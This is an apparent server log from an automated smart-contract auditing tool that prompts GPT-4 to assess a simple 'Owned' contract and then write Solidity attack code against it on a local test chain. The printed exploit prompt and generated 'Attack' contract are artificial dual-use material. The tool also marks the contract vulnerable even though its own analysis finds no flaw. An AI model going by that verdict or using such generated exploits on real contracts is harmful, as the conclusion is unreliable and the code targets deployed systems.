2025-06-23 06:02:47,464 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:47,467 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:47,469 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:47,471 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:02:47,473 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:47] "POST /analyze HTTP/1.1" 200 -
2025-06-23 06:02:47,492 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:47,495 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:47,498 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:47,501 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 06:02:47,506 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:47] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 06:02:47,562 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:47,565 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:47,568 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:47,569 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:02:47,571 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:47] "GET /history HTTP/1.1" 200 -
2025-06-23 06:03:00,844 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:03:00,856 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 06:03:00,866 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 06:03:00,870 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp0c09ozmd.sol
2025-06-23 06:03:00,882 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 06:03:00,884 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 06:03:00,897 - solcx - INFO - Using solc version 0.8.0
2025-06-23 06:03:01,699 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-23 06:03:01,701 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-23 06:03:02,136 - app.services.contract_service - INFO - Contract Owned deployed at 0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B
2025-06-23 06:03:02,138 - app.services.contract_service - INFO - Setting up contract Owned...
2025-06-23 06:03:02,268 - app.services.contract_service - INFO - Contract Owned setup completed
2025-06-23 06:03:02,270 - app.services.contract_service - INFO - Funding contract Owned for attack testing...
2025-06-23 06:03:02,433 - app.services.contract_service - INFO - Contract Owned funded
2025-06-23 06:03:02,435 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 06:03:02,591 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 06:03:02,593 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 06:03:02,594 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 06:03:02,602 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 06:03:02,613 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 06:03:02,615 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 06:03:02,617 - app.modules.attack_generator - INFO - Contract name: Owned
2025-06-23 06:03:02,618 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 06:03:02,619 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 06:03:02,621 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 06:03:02,622 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 06:03:02,623 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 06:03:11,514 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 06:03:11,536 - app.modules.attack_generator - INFO - Received response from OpenAI API in 8.91 seconds
2025-06-23 06:03:11,541 - app.modules.attack_generator - INFO - Contract analysis completed in 8.91 seconds
2025-06-23 06:03:11,544 - app.modules.attack_generator - INFO - Vulnerability assessment: - **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by th...
2025-06-23 06:03:11,547 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 06:03:11,549 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 06:03:11,552 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 06:03:11,554 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 06:03:15,716 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 06:03:15,725 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.17 seconds
2025-06-23 06:03:15,729 - app.modules.attack_generator - INFO - Attack code generation completed in 4.17 seconds
2025-06-23 06:03:15,731 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 259
2025-06-23 06:03:15,733 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 13.09 seconds
2025-06-23 06:03:15,735 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 06:03:15,738 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0c09ozmd.sol",\n  "contracts": [\n    {\n      "contract_name": "Owned",\n      "address": "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "destroy",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "destroy",\n          "signature": "destroy()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99988619360000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Owned {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\"Not owner\\");\\n        _;\\n    }\\n\\n    function destroy() public onlyOwner {\\n        selfdestruct(payable(owner));\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `Owned` is a simple ownership contract that sets the deployer as the owner. It has a single critical function `destroy()` which calls `selfdestruct` on the contract, sending any remaining ETH balance to the owner. The contract uses Solidity version pragma `^0.8.0`.\n\n2. Vulnerability Assessment:  \n- **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  \n- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  \n- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  \n- **No backdoors or unsafe calls:** The contract is minimal and straightforward.\n\n3. Exploitation Requirements:  \n- The attacker must become the owner (e.g., by compromising the private key of the owner address). Without ownership, the `destroy()` function cannot be called.  \n- Once ownership is obtained, the attacker can call `destroy()` to selfdestruct the contract, which could disrupt systems depending on it.\n\n---\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- No direct vulnerabilities in the contract itself.  \n- The main risk is centralized control of the `destroy()` function by the owner, which if compromised, allows contract destruction.  \n- No ETH is held by the contract, so no direct fund loss occurs from destruction.', 'contract_analysis': 'The contract `Owned` is a simple ownership contract that sets the deployer as the owner. It has a single critical function `destroy()` which calls `selfdestruct` on the contract, sending any remaining ETH balance to the owner. The contract uses Solidity version pragma `^0.8.0`.\n\n2.', 'vulnerability_assessment': '- **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  \n- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  \n- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  \n- **No backdoors or unsafe calls:** The contract is minimal and straightforward.\n\n3.', 'exploitation_requirements': '- The attacker must become the owner (e.g., by compromising the private key of the owner address). Without ownership, the `destroy()` function cannot be called.  \n- Once ownership is obtained, the attacker can call `destroy()` to selfdestruct the contract, which could disrupt systems depending on it.', 'analysis_duration': 8.913540124893188}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `Owned` is a simple ownership contract that sets the deployer as the owner. It has a single critical function `destroy()` which calls `selfdestruct` on the contract, sending any remaining ETH balance to the owner. The contract uses Solidity version pragma `^0.8.0`.\n\n2.\n\nVulnerability Assessment: - **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  \n- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  \n- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  \n- **No backdoors or unsafe calls:** The contract is minimal and straightforward.\n\n3.\n\nExploitation Requirements: - The attacker must become the owner (e.g., by compromising the private key of the owner address). Without ownership, the `destroy()` function cannot be called.  \n- Once ownership is obtained, the attacker can call `destroy()` to selfdestruct the contract, which could disrupt systems depending on it.\n\n\nTarget Contract Address: 0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface IOwned {\n    function destroy() external;\n}\n\ncontract Attack {\n    IOwned target;\n\n    constructor(address _target) {\n        target = IOwned(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface IOwned {\n    function destroy() external;\n}\n\ncontract Attack {\n    IOwned target;\n\n    constructor(address _target) {\n        target = IOwned(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}', 'code_type': 'solidity', 'attack_duration': 4.173567295074463}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp0c09ozmd.sol",\n  "contracts": [\n    {\n      "contract_name": "Owned",\n      "address": "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B",\n      "abi": [\n        {\n          "inputs": [],\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "inputs": [],\n          "name": "destroy",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "destroy",\n          "signature": "destroy()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99988619360000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Owned {\\n    address public owner;\\n\\n    constructor() {\\n        owner = msg.sender;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\"Not owner\\");\\n        _;\\n    }\\n\\n    function destroy() public onlyOwner {\\n        selfdestruct(payable(owner));\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:  \nThe contract `Owned` is a simple ownership contract that sets the deployer as the owner. It has a single critical function `destroy()` which calls `selfdestruct` on the contract, sending any remaining ETH balance to the owner. The contract uses Solidity version pragma `^0.8.0`.\n\n2. Vulnerability Assessment:  \n- **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  \n- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  \n- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  \n- **No backdoors or unsafe calls:** The contract is minimal and straightforward.\n\n3. Exploitation Requirements:  \n- The attacker must become the owner (e.g., by compromising the private key of the owner address). Without ownership, the `destroy()` function cannot be called.  \n- Once ownership is obtained, the attacker can call `destroy()` to selfdestruct the contract, which could disrupt systems depending on it.\n\n---\n**Summary:**  \n- Solidity version: `^0.8.0`  \n- No direct vulnerabilities in the contract itself.  \n- The main risk is centralized control of the `destroy()` function by the owner, which if compromised, allows contract destruction.  \n- No ETH is held by the contract, so no direct fund loss occurs from destruction.', 'reasoning': 'The contract `Owned` is a simple ownership contract that sets the deployer as the owner. It has a single critical function `destroy()` which calls `selfdestruct` on the contract, sending any remaining ETH balance to the owner. The contract uses Solidity version pragma `^0.8.0`.\n\n2.', 'summary': '- **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  \n- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  \n- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  \n- **No backdoors or unsafe calls:** The contract is minimal and straightforward.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface IOwned {\n    function destroy() external;\n}\n\ncontract Attack {\n    IOwned target;\n\n    constructor(address _target) {\n        target = IOwned(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}', 'code_type': 'solidity', 'duration': 13.087107419967651}
2025-06-23 06:03:15,741 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 06:03:15,743 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 06:03:15,744 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 06:03:15,745 - app.services.contract_service - INFO - Attack strategy summary: - **No direct vulnerabilities in logic or permissions:** The `destroy()` function is protected by the `onlyOwner` modifier, ensuring only the owner can call it.  
- **Potential risk from selfdestruct:** While `selfdestruct` is a powerful function that permanently removes the contract code and sends ETH to the owner, it can be dangerous if ownership is compromised. If the owner key is leaked or compromised, an attacker can destroy the contract and potentially disrupt any dependent contracts or systems relying on this contract.  
- **No reentrancy or math issues:** The contract does not hold ETH (balance is zero) and has no complex logic.  
- **No backdoors or unsafe calls:** The contract is minimal and straightforward.

3.
2025-06-23 06:03:15,746 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 06:03:15,748 - app.services.contract_service - INFO - Temporary file /tmp/tmp0c09ozmd.sol removed
2025-06-23 06:03:15,763 - app.api.contract - INFO - Report saved with filename: Owned_2025-06-23_06-03, status: KO
2025-06-23 06:03:15,765 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 06:03:15,767 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:15,769 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:15,770 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:15,771 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:03:15,773 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:15] "POST /analyze HTTP/1.1" 200 -
2025-06-23 06:03:15,803 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:15,805 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:15,807 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:15,808 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:03:15,810 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:15] "GET /history HTTP/1.1" 200 -
2025-06-23 06:03:20,438 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:20,443 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:20,445 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:20,448 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:03:20,451 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:20] "GET /history HTTP/1.1" 200 -
